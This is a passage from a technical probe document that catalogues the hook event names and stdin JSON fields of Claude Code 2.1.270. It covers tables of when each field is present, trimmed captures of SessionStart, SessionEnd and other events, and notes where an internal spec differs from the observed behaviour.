| [Auto compaction: `PreCompact{trigger:auto}` / `PostCompact`, and death mid-compaction](#auto-compaction-precompacttriggerauto--postcompact-and-death-mid-compaction) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | l.966, l.1087, l.921 | M2 |
| [`SessionEnd.reason` = `resume` and `logout`](#sessionendreason--resume-and-logout) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | l.969, l.970 | M2 |
| [MCP elicitation in the TUI: `Notification.notification_type`](#mcp-elicitation-in-the-tui-notificationnotification_type) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | partial | l.937 | M2 |
| [Resume across Claude Code versions (2.1.259 ↔ 2.1.270)](#resume-across-claude-code-versions-21259--21270) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | l.1535, l.1552-1553 | M4 |
| [`can_use_tool` blocking longer than `await_decision(timeout_s=600)`](#can_use_tool-blocking-longer-than-await_decisiontimeout_s600) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | l.1725-1749 | M4 |
| [Browser terminal transport: WebSocket on the "stdlib HTTP + SSE" stack](#browser-terminal-transport-websocket-on-the-stdlib-http--sse-stack) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | §9, l.1150, §5, l.406 | M3 |
| [Fallback `PtyRunner`: the Claude Code TUI under Python `pty.fork`](#fallback-ptyrunner-the-claude-code-tui-under-python-ptyfork) | [gap-fill](#surface-gap-fill-claims-no-other-surface-probed) | verified | l.1144-1145, l.423-430 | M3 |

<!-- Rendered by build_section.py from SECTION.tmpl.md. Every fenced example below is pulled
     byte-for-byte from a capture file under docs/probes/2026-09-14-schemas/hooks/; the only edit
     is trimming of long JSON strings, marked with "...". Do not hand-edit SECTION.md. -->
<!-- AUDIT 2026-09-14 (auditor pass): every fenced example (93 non-empty lines) was re-traced to its
     capture file: each line is a byte-for-byte substring of one capture line (with "..." trims), and
     the multi-line blocks are contiguous in their source files. No example or value comes from a real
     user session (every transcript_path is under -tmp-shp-*; the only API key is the mock's fake
     key). The auditor then hand-edited prose only: some Status lines were downgraded and some
     Spec-alignment bullets were corrected (each is marked "Audit:"). SECTION.tmpl.md was NOT updated,
     so re-running build_section.py drops these edits. -->

## Claude Code hooks (headless `-p`, plus one TUI run) — schemas observed 2026-09-14

**Surface:** `hooks`. **Source:** `docs/probes/2026-09-14-schemas/hooks/SECTION.md`. Paths that do not start with `docs/` or `/` are relative to `docs/probes/2026-09-14-schemas/hooks/` (or to the capture folder named in the same caption).

**Scope of this section.** Claude Code 2.1.270 on Linux 6.8 (binary
`/root/.local/share/claude/versions/2.1.270`, sha256 `3a624a5a…3ef0`, recorded in
`docs/probes/2026-09-14-schemas/hooks/binary/version.txt`). Every live run records
`claude --version` in its `meta.json` and in every capture line (`_claude_version`).

**How the evidence was made.**

| Probe | What it is | Re-run |
|---|---|---|
| `docs/probes/2026-09-14-schemas/hooks/extract_binary.py` | byte-search of the CLI binary for the event enum, the zod input/output schemas, the settings hooks schema, enums and runtime snippets → `docs/probes/2026-09-14-schemas/hooks/binary/` | `python3 docs/probes/2026-09-14-schemas/hooks/extract_binary.py` |
| `docs/probes/2026-09-14-schemas/hooks/run_probes.py` | 50+ headless runs, each in a fresh `mktemp`-style dir under `/tmp`, hooks for all 33 events in `<tmpdir>/.claude/settings.json` (or `--settings`), `claude-haiku-4-5-20251001` unless noted → `docs/probes/2026-09-14-schemas/hooks/live/<scenario>/` | `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py list` then `… run_probes.py S01 S02 …` (S02–S06, S14 reuse S01's session) |
| `docs/probes/2026-09-14-schemas/hooks/interactive_probe.py` | one TUI session driven through a private `pty.fork()` (no tmux) for the events `-p` cannot reach → `docs/probes/2026-09-14-schemas/hooks/live/I01_interactive/` | `python3 docs/probes/2026-09-14-schemas/hooks/interactive_probe.py` |
| `docs/probes/2026-09-14-schemas/hooks/mock_api.py` | 127.0.0.1 stand-in for the Messages API (fake key, isolated `CLAUDE_CONFIG_DIR`) used only to provoke API-error classes → `docs/probes/2026-09-14-schemas/hooks/live/S08_*`, `docs/probes/2026-09-14-schemas/hooks/live/S22_*` | started by `run_probes.py S08` / `S22` |
| `docs/probes/2026-09-14-schemas/hooks/capture_hook.sh` | the hook command: appends raw stdin + event name + UTC timestamp + `/proc` parent chain + claude pid, fork-free bash | — |
| `docs/probes/2026-09-14-schemas/hooks/capture_env.py` | second hook on some events: env var names (values only for an allowlist, secrets `<redacted>`), stdin/tty facts, ancestry with cmdlines | — |
| `docs/probes/2026-09-14-schemas/hooks/summarize.py` / `docs/probes/2026-09-14-schemas/hooks/build_section.py` | field matrix (`docs/probes/2026-09-14-schemas/hooks/live/_field-matrix.txt`, `docs/probes/2026-09-14-schemas/hooks/live/_sequences.txt`) and this file | `python3 …/summarize.py && python3 …/build_section.py` |

**Safety record.** `~/.claude/settings.json` sha256 was identical before and after every run
(`meta.json` → `user_settings_sha256_*`). The cc10x user plugin was disabled in every throwaway
settings file and **did not register or fire** (debug: `Read hooks.json for plugin cc10x (enabled=false; will NOT register, plugin is disabled)`,
`docs/probes/2026-09-14-schemas/hooks/live/*/debug-cc10x-lines.txt`; the only hook commands in any debug log are `docs/probes/2026-09-14-schemas/hooks/capture_hook.sh`/`docs/probes/2026-09-14-schemas/hooks/capture_env.py`).
`CLAUDE*`/`CLAUDECODE` vars inherited from the calling session were scrubbed before each launch;
`PATH`, `TERM`, `TMUX` were still inherited from it. Claude Code itself wrote trust/bookkeeping
entries to `~/.claude.json` and transcripts under `~/.claude/projects/-tmp-shp-hooks-*`.
No real user transcript was read for this section.

---

### Hook event names (the enum)

- **Produced by:** Claude Code 2.1.270 (settings validator `Im` and SDK schema `Sle`, identical lists)
- **Consumed by:** §6 `EngineAdapter.hook_events()` / capability matrix (spec line 550), §8 "Events subscribed" (lines 912–923); D9, D24; M1
- **Probe:** `docs/probes/2026-09-14-schemas/hooks/extract_binary.py` → `docs/probes/2026-09-14-schemas/hooks/binary/hook-events.json`, `docs/probes/2026-09-14-schemas/hooks/binary/sdk-hook-events.json`; live cross-check `run_probes.py all` + `docs/probes/2026-09-14-schemas/hooks/interactive_probe.py` → `docs/probes/2026-09-14-schemas/hooks/live/_field-matrix.txt`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/extract_binary.py && python3 docs/probes/2026-09-14-schemas/hooks/summarize.py`
- **Status:** partially verified — 31 of 33 names fired live 2026-09-14; TeammateIdle and WorktreeRemove from the binary only

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/R03_config_unknown_event_name/doctor.txt` — the list as printed by `claude doctor`; same list extracted from the binary in `docs/probes/2026-09-14-schemas/hooks/binary/hook-events.json`)

```text
Valid events: PreToolUse, PostToolUse, PostToolUseFailure, PostToolBatch, Notification, UserPromptSubmit, UserPromptExpansion, SessionStart, SessionEnd, Stop, StopFailure, SubagentStart, SubagentStop, PreCompact, PostCompact, PreModelSwitch, PostModelSwitch, PermissionRequest, PermissionDenied, Setup, TeammateIdle, TaskCreated, TaskCompleted, Elicitation, ElicitationResult, ConfigChange, WorktreeCreate, WorktreeRemove, InstructionsLoaded, CwdChanged, FileChanged, DirectoryAdded, MessageDisplay
```

| # | Event | Fired live? | Where |
|---|---|---|---|
| 1 | PreToolUse | yes (42) | S01, S09, S10, … |
| 2 | PostToolUse | yes (30) | S01, S17 (MCP tool), … |
| 3 | PostToolUseFailure | yes (2) | S01 (`false`, Read of missing file) |
| 4 | PostToolBatch | yes (40) | S01, S09, R01 |
| 5 | Notification | yes (3) | I01 (TUI) ×2, S17 (`-p`, MCP elicitation) |
| 6 | UserPromptSubmit | yes (57) | all runs with a prompt |
| 7 | UserPromptExpansion | yes (1) | S12 (custom slash command) |
| 8 | SessionStart | yes (55) | all runs |
| 9 | SessionEnd | yes (50) | most runs (see SessionEnd for the gaps) |
| 10 | Stop | yes (26) | S01, S10, S11, … |
| 11 | StopFailure | yes (23) | S07 (real API), S08 (mock API), R03, R04, S16 |
| 12 | SubagentStart | yes (2) | S01, S18 |
| 13 | SubagentStop | yes (4) | S01, S18, S05 (compaction), I01 |
| 14 | PreCompact | yes (1, `manual`) | S05 |
| 15 | PostCompact | yes (1, `manual`) | S05 |
| 16 | PreModelSwitch | yes (1) | S14 (`/model sonnet` in `-p`) |
| 17 | PostModelSwitch | yes (1) | S14 |
| 18 | PermissionRequest | yes (6) | S01, S09, S13, I01 |
| 19 | PermissionDenied | yes (1) | S20 (auto mode, classifier deny, sonnet) |
| 20 | Setup | yes (3) | S16 (`--init`, `--init-only`, `--maintenance`) |
| 21 | TeammateIdle | **no** | not attempted (agent teams) |
| 22 | TaskCreated | yes (3) | S01, S18 |
| 23 | TaskCompleted | yes (2) | S01, S18 |
| 24 | Elicitation | yes (1) | S17 |
| 25 | ElicitationResult | yes (1) | S17 |
| 26 | ConfigChange | yes (1) | S21 |
| 27 | WorktreeCreate | yes (1) | S15 (`--worktree`) |
| 28 | WorktreeRemove | **no** | not provoked (S15's create hook returned no path, so no worktree existed to remove) |
| 29 | InstructionsLoaded | yes (16) | every run with a `CLAUDE.md` |
| 30 | CwdChanged | yes (1) | S13 (`cd sub && pwd`) |
| 31 | FileChanged | yes (2) | S13, S21 (only for hook-declared `watchPaths`) |
| 32 | DirectoryAdded | yes (1) | I01 (`/add-dir`) |
| 33 | MessageDisplay | yes (51) | most runs |

**Variants and edge cases:**
- The settings validator and the SDK type list are the same 33 names in the same order (`docs/probes/2026-09-14-schemas/hooks/binary/hook-events.json` vs `docs/probes/2026-09-14-schemas/hooks/binary/sdk-hook-events.json`).
- An unknown event key in settings is ignored with a warning, not an error (see Hooks config schema).

**Spec alignment:**
- spec line 550 says `hooks | **rich** (32 events)`; reality is 33 event names in 2.1.270 (`docs/probes/2026-09-14-schemas/hooks/binary/hook-events.json` `"count": 33`).
- spec lines 912–923 (events subscribed): every name exists. Not subscribed but relevant to Shepherd's columns: `PostToolBatch` (the only event emitted for a denied/hook-blocked tool call, see PostToolBatch), `InstructionsLoaded`, `ConfigChange`, `DirectoryAdded`, `Setup`, `UserPromptExpansion`, `WorktreeCreate/Remove`, `TeammateIdle`.

---

### Common input fields (every hook's stdin JSON)

- **Produced by:** Claude Code 2.1.270, builder `La()` (`docs/probes/2026-09-14-schemas/hooks/binary/runtime-source-snippets.txt` line 3) and zod base schema `we` (`docs/probes/2026-09-14-schemas/hooks/binary/hook-input-schemas.txt` line 2)
- **Consumed by:** §8 "Common fields on every hook event" (lines 929–931), §8 event→column table (lines 878–887), §7 `session.engine_session_id`/`cwd`/`last_event_at` (lines 652, 676); D22, D24, D37; M1
- **Probe:** `run_probes.py all` + `docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`, matrix by `docs/probes/2026-09-14-schemas/hooks/build_section.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S10 && python3 docs/probes/2026-09-14-schemas/hooks/build_section.py`
- **Status:** verified live 2026-09-14 (429 captures, 53 runs)

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl` — a main-thread and a subagent PreToolUse; `docs/probes/2026-09-14-schemas/hooks/live/S10_effort_sonnet/events.jsonl` for `effort`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"echo hello","description":"Echo hello"},"tool_use_id":"toolu_015R8tPjv7FUHuW6MDJj8HpT"}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","agent_id":"a7154de3fc719065c","agent_type":"general-purpose","hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"echo sub","description":"Echo the word \"sub\""},"tool_use_id":"toolu_01J7Hz4JQN7aKxM639k1RP4M"}
{"session_id":"5c59934b-3bd1-43ab-9506-a6a16f581034","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-effort-7yb7myuc/5c59934b-3bd1-43ab-9506-a6a16f581034.jsonl","cwd":"/tmp/shp-hooks-effort-7yb7myuc","prompt_id":"a95c9922-3b49-44f2-8906-ef313239b6c1","permission_mode":"default","effort":{"level":"low"},"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"echo effort"},"tool_use_id":"toolu_01GMFr9hqoiRLwgVGjRNm3LY"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `session_id` | string (UUID) | always | e.g. `8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6` | Changes on `/clear` (new id on `SessionStart{source:clear}`) and on `--fork-session`; kept by `--resume`. With `--continue`, the first `InstructionsLoaded` carried a provisional id (`437540c8…`) different from the resumed id on `SessionStart` (`8bbcceab…`) (`docs/probes/2026-09-14-schemas/hooks/live/S03_continue/events.jsonl`) |
| `transcript_path` | string | always | `/root/.claude/projects/<cwd with every non-alphanumeric char → "-">/<session_id>.jsonl`; under `$CLAUDE_CONFIG_DIR/projects/…` when that is set | Use verbatim; `_` in cwd becomes `-` (`-tmp-shp-hooks-slash--ul-amd7` for `/tmp/shp-hooks-slash-_ul_amd7`) |
| `cwd` | string | always | session cwd; after a Bash `cd` the value follows the new dir (`CwdChanged` example) | |
| `hook_event_name` | string | always | the 33 names | |
| `prompt_id` | string (UUID) | sometimes | see matrix | Absent before the first prompt of the process (all `SessionStart{startup/resume/fork/clear}`, `InstructionsLoaded`, `Setup`, `WorktreeCreate`); present on `SessionStart{compact}` |
| `permission_mode` | string | sometimes | `default`, `acceptEdits`, `dontAsk`, `plan`, `auto` | Only on tool/turn events (see matrix). `bypassPermissions` not observable here: refused as root (`docs/probes/2026-09-14-schemas/hooks/live/S09_perm_bypass_echo/stderr.txt`). `--permission-mode auto` on haiku silently ran as `default` (`docs/probes/2026-09-14-schemas/hooks/live/S09_perm_auto_mode_delete_outside`) |
| `effort` | object `{level}` | sometimes | `{"level":"low"}` (sonnet `--effort low`), `{"level":"high"}` (sonnet default; also nonexistent model) | Absent on every haiku event; never on SessionStart/SessionEnd/UserPromptSubmit/MessageDisplay/Notification/Task*/Subagent*; present on tool events, Stop, PermissionDenied and StopFailure when the model supports effort |
| `agent_id` | string | sometimes | `a7154de3fc719065c` | Only on events fired inside a subagent (and on Subagent* events) |
| `agent_type` | string | sometimes | `general-purpose`, `shpprobe` (custom `--agents`), `""` | `""` on SubagentStop of internal subagents (compaction, post-turn) |
| `scratchpad_dir` | string | sometimes | `/tmp/claude-0/<project>/<session_id>/scratchpad` | **Not in the zod schema** but emitted by `La()`; seen only in the TUI run (I01) |
| any timestamp | — | **never** | — | No payload key is a time; `seconds_since_last_response` (SessionStart resume/fork) is the only time-like field. Receipt time must be stamped by the receiver |

Common-field presence per event, over all retained captures (`docs/probes/2026-09-14-schemas/hooks/live/*/events.jsonl`):

| Event (n captures) | `session_id` | `transcript_path` | `cwd` | `hook_event_name` | `prompt_id` | `permission_mode` | `effort` | `agent_id` | `agent_type` | `scratchpad_dir` |
|---|---|---|---|---|---|---|---|---|---|---|
| ConfigChange (1) | always | always | always | always | always | never | never | never | never | never |
| CwdChanged (1) | always | always | always | always | always | never | never | never | never | never |
| DirectoryAdded (1) | always | always | always | always | always | never | never | never | never | always |
| Elicitation (1) | always | always | always | always | always | never | never | never | never | never |
| ElicitationResult (1) | always | always | always | always | always | never | never | never | never | never |
| FileChanged (2) | always | always | always | always | always | never | never | never | never | never |
| InstructionsLoaded (16) | always | always | always | always | never | never | never | never | never | never |
| MessageDisplay (51) | always | always | always | always | always | never | never | never | never | 1/51 |
| Notification (3) | always | always | always | always | always | never | never | never | never | 2/3 |
| PermissionDenied (1) | always | always | always | always | always | always | always | never | never | never |
| PermissionRequest (6) | always | always | always | always | always | always | never | never | never | 1/6 |
| PostCompact (1) | always | always | always | always | always | never | never | never | never | never |
| PostModelSwitch (1) | always | always | always | always | always | never | never | never | never | never |
| PostToolBatch (40) | always | always | always | always | always | always | 3/40 | 1/40 | 1/40 | never |
| PostToolUse (30) | always | always | always | always | always | always | 3/30 | 1/30 | 1/30 | never |
| PostToolUseFailure (2) | always | always | always | always | always | always | never | never | never | never |
| PreCompact (1) | always | always | always | always | always | never | never | never | never | never |
| PreModelSwitch (1) | always | always | always | always | always | never | never | never | never | never |
| PreToolUse (42) | always | always | always | always | always | always | 4/42 | 1/42 | 1/42 | 1/42 |
| SessionEnd (50) | always | always | always | always | 48/50 | never | never | never | never | 2/50 |
| SessionStart (55) | always | always | always | always | 1/55 | never | never | never | never | 2/55 |
| Setup (3) | always | always | always | always | never | never | never | never | never | never |
| Stop (26) | always | always | always | always | always | always | 4/26 | never | never | 1/26 |
| StopFailure (23) | always | always | always | always | always | never | 13/23 | never | never | never |
| SubagentStart (2) | always | always | always | always | always | never | never | always | always | never |
| SubagentStop (4) | always | always | always | always | always | always | never | always | always | 1/4 |
| TaskCompleted (2) | always | always | always | always | always | never | never | never | never | never |
| TaskCreated (3) | always | always | always | always | always | never | never | never | never | never |
| UserPromptExpansion (1) | always | always | always | always | always | always | never | never | never | never |
| UserPromptSubmit (57) | always | always | always | always | always | always | never | never | never | 2/57 |
| WorktreeCreate (1) | always | always | always | always | never | never | never | never | never | never |

**Variants and edge cases:**
- Claude Code writes the JSON followed by one `\n` and then closes stdin (429/429 captures have `_raw_trailing_newline: true`).
- Field order is stable: common fields first (`session_id, transcript_path, cwd, [scratchpad_dir], [prompt_id], [permission_mode], [agent_id, agent_type], [effort]`), then `hook_event_name`, then event fields.
- `effort` sits **before** `hook_event_name` in the byte stream; do not parse positionally.

**Spec alignment:**
- spec lines 929–931 say "Common fields on every hook event: `session_id`, `prompt_id`, `transcript_path`, `cwd`, `permission_mode`, `effort.level`, `hook_event_name`"; reality is only `session_id`, `transcript_path`, `cwd`, `hook_event_name` are on every event. `prompt_id` is missing on 54/55 SessionStart, all InstructionsLoaded/Setup/WorktreeCreate; `permission_mode` is missing on SessionStart, SessionEnd, StopFailure, MessageDisplay, Notification, TaskCreated/TaskCompleted, SubagentStart, Pre/PostCompact, Pre/PostModelSwitch, InstructionsLoaded, ConfigChange, CwdChanged, FileChanged, DirectoryAdded, Elicitation*; `effort` is absent for haiku and on lifecycle events (matrix above; `docs/probes/2026-09-14-schemas/hooks/live/_field-matrix.txt`).
- spec line 881 (`SessionStart` registers `engine_session_id`) is aligned, but the id is not stable for the life of a terminal: `/clear` ends it (`SessionEnd{reason:clear}`) and starts a new id (`docs/probes/2026-09-14-schemas/hooks/live/S06_clear/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/I01_interactive/events.jsonl`). spec line 652 ("nothing may key off it") is consistent with this.
- spec line 880 (`last_event_at` from any event) is aligned only if stamped on receipt: no event carries a timestamp.

---

### SessionStart

- **Produced by:** Claude Code 2.1.270 (zod `Ple`, `docs/probes/2026-09-14-schemas/hooks/binary/hook-input-schemas.txt` line 24)
- **Consumed by:** §8 line 881 (register attached session, `cwd`→repo), line 922; §9 `ask()` fork (line 1205); D1, D13, D22; M1, M3
- **Probe:** `run_probes.py S01 S02 S03 S04 S05 S06` + `docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S02 S03 S04 S05 S06`
- **Status:** partially verified — all 5 `source` values and the resume/fork/compact extras live 2026-09-14; optional `agent_type` and `session_title` never observed (schema only). Audit: downgraded from "verified"

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S02_resume/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S04_fork/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S05_compact/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S06_clear/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/I01_interactive/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","hook_event_name":"SessionStart","source":"startup"}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","hook_event_name":"SessionStart","source":"resume","seconds_since_last_response":10,"context_tokens":25613,"prompt_cache_likely_expired":false,"estimated_cache_write_usd":0.0512}
{"session_id":"e4fa0c49-4643-43e0-b4db-9718159c2925","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/e4fa0c49-4643-43e0-b4db-9718159c2925.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","hook_event_name":"SessionStart","source":"fork","seconds_since_last_response":3,"context_tokens":25768,"prompt_cache_likely_expired":false,"estimated_cache_write_usd":0.0515}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"4cd9a4b3-3847-487a-bdad-6d2317fe2948","hook_event_name":"SessionStart","source":"compact","model":"claude-haiku-4-5-20251001"}
{"session_id":"95945ad4-d3ab-4ad9-9ee2-28981ab616e2","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/95945ad4-d3ab-4ad9-9ee2-28981ab616e2.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","hook_event_name":"SessionStart","source":"clear"}
{"session_id":"1dda4143-3fdf-40ef-b167-252c1abd1e15","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15.jsonl","cwd":"/tmp/shp-hooks-tui-1tlg88mq","scratchpad_dir":"/tmp/claude-0/-tmp-shp-hooks-tui-1tlg88mq/1dda4143-3fdf-40ef-b167-252c1abd1e15/scratchpad","hook_event_name":"SessionStart","source":"startup","model":"claude-haiku-4-5-20251001"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `source` | enum | always | `startup` (45), `resume` (6), `clear` (2), `fork` (1), `compact` (1) | binary enum `["startup","resume","clear","compact","fork"]`; `--continue` reports `resume` |
| `model` | string | sometimes (2/55) | `claude-haiku-4-5-20251001` | seen on TUI startup and on `compact` |
| `seconds_since_last_response` | int | sometimes (7/55) | `10`, `3` | only `resume`/`fork` |
| `context_tokens` | int | sometimes (7/55) | `25613` | only `resume`/`fork` |
| `prompt_cache_likely_expired` | bool | sometimes (7/55) | `false`, `true` | only `resume`/`fork` |
| `estimated_cache_write_usd` | number | sometimes (7/55) | `0.0512` | only `resume`/`fork` |
| `agent_type` | string | never observed | — | schema: present with `--agent` |
| `session_title` | string | never observed | — | schema only |

**Variants and edge cases:**
- Order on resume: `InstructionsLoaded` fires **before** `SessionStart` (S02–S06).
- `/compact`: `PreCompact` → internal `SubagentStop{agent_type:""}` → `SessionStart{source:compact}` (same session id, carries `prompt_id`) → `PostCompact` (`docs/probes/2026-09-14-schemas/hooks/live/S05_compact/events.jsonl`).
- `/clear` in `-p` and TUI: `SessionEnd{reason:clear}` (old id) → `SessionStart{source:clear}` (new id, no `prompt_id`).
- `-p` in a never-trusted dir still runs hooks (trust dialog skipped in `-p`); in the TUI, `SessionStart` fired only after the trust dialog was accepted (`docs/probes/2026-09-14-schemas/hooks/live/I01_interactive/steps.txt`).
- The matcher value is `source` (`hook_name` `SessionStart:startup` in `docs/probes/2026-09-14-schemas/hooks/live/S07_bad_model/stdout.jsonl`).

**Spec alignment:**
- spec line 1205 says "`SessionStart` hook's `start_reason` enum includes `fork`"; reality: the field is `source`; `fork` verified live with `--resume <id> --fork-session` (`docs/probes/2026-09-14-schemas/hooks/live/S04_fork/events.jsonl`).
- spec line 881: aligned (`session_id`, `cwd` always present).

---

### SessionEnd

- **Produced by:** Claude Code 2.1.270 (zod `ice`, reason enum `rce`, `docs/probes/2026-09-14-schemas/hooks/binary/hook-input-schemas.txt`)
- **Consumed by:** §8 lines 887, 918 (stop trigger), lines 967–970 (`user_exited`, `cleared`, `logged_out`, `resumed_elsewhere`); D24; M1, M2
- **Probe:** `run_probes.py S01 S06 S07 S08 S11 R04` + `docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S06 S07 S11 && python3 docs/probes/2026-09-14-schemas/hooks/interactive_probe.py`
- **Status:** partially verified — `other`, `clear`, `prompt_input_exit` live; `logout`, `resume` binary only

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S06_clear/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/I01_interactive/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","hook_event_name":"SessionEnd","reason":"other"}
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"195cafac-c608-402b-9e39-1fde2bdb8c08","hook_event_name":"SessionEnd","reason":"clear"}
{"session_id":"a51d4a06-747f-4aaa-856e-3d451e9c9841","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-tui-1tlg88mq/a51d4a06-747f-4aaa-856e-3d451e9c9841.jsonl","cwd":"/tmp/shp-hooks-tui-1tlg88mq","scratchpad_dir":"/tmp/claude-0/-tmp-shp-hooks-tui-1tlg88mq/a51d4a06-747f-4aaa-856e-3d451e9c9841/scratchpad","prompt_id":"79e10e3a-d6a6-4942-8902-88f9ca2bac9c","hook_event_name":"SessionEnd","reason":"prompt_input_exit"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `reason` | enum | always | `other` (47), `clear` (2), `prompt_input_exit` (1) | binary enum `["clear","resume","logout","prompt_input_exit","other"]`. Every `-p` exit, success or error, is `other` |

**Variants and edge cases:**
- **`SessionEnd` is not guaranteed in `-p`.** It was never dispatched (no SessionEnd line in the debug log) in `S07_bad_model`, `S08_mock_http429`, `R04_settings_flag` (StopFailure exits) and `S11_background_task` (`docs/probes/2026-09-14-schemas/hooks/live/S11_background_task/debug-extras.txt`: `print wind-down: killing background shell bx4s43qvk ("Background sleep and echo command") after 5000ms grace`, then exit). It did arrive in the other 20 StopFailure runs. `S15_worktree` failed before any session existed. Treat process exit as the stop signal of record.
- `logout` not attempted: `/logout` would sign the user out of the real account on this machine. `resume` (switching sessions via `/resume` inside a TUI) not attempted.
- `prompt_id` present 48/50 (absent when no prompt was ever submitted in that session id, e.g. the post-`/clear` id in `-p`).

**Spec alignment:**
- spec lines 967–970 say `SessionEnd.end_reason = …`; reality: the field is `reason` (`docs/probes/2026-09-14-schemas/hooks/live/S06_clear/events.jsonl`). Values `prompt_input_exit`, `clear` verified; `logout`, `resume` exist in the binary enum.
- spec line 887 (`Stop` / `StopFailure` / `SessionEnd` triggers classification): aligned. SessionEnd was missing in 4 `-p` runs that had a session (above), but in each of those runs a `Stop` or `StopFailure` reached the bash capture hook. The spec already treats "observed process exit" as a stop signal (line 938) and has a `crashed` rule (line 964). Audit: this was a claimed misalignment and is refuted. The real risk is a slow hook losing StopFailure at `-p` shutdown (see StopFailure and the Hook runtime contract).

---

### UserPromptSubmit

- **Produced by:** Claude Code 2.1.270 (zod `kle`)
- **Consumed by:** §8 line 882 (`brief`), line 922; §7 `brief` (line 664); M1
- **Probe:** `run_probes.py S01 S18 R01`. Re-run: `python3 docs/probes/2026-09-14-schemas/hooks/run_probes.py S01 S18`
- **Status:** partially verified — payload verified live 2026-09-14; optional `source` and `session_title` never observed

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/hooks/live/S01_startup_tools/events.jsonl`, `docs/probes/2026-09-14-schemas/hooks/live/S18_agents_tasks/events.jsonl`)

```json
{"session_id":"8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6","transcript_path":"/root/.claude/projects/-tmp-shp-hooks-base-dwqg6d95/8bbcceab-0b3e-4e24-98c9-ec146b1ca8c6.jsonl","cwd":"/tmp/shp-hooks-base-dwqg6d95","prompt_id":"23d7f57d-6e63-45f1-9217-c7395a4c98a9","permission_mode":"default","hook_event_name":"UserPromptSubmit","prompt":"This is a hook test. Do these steps in order, exactly one tool call per step, do not skip any step even if one fails, an..."}
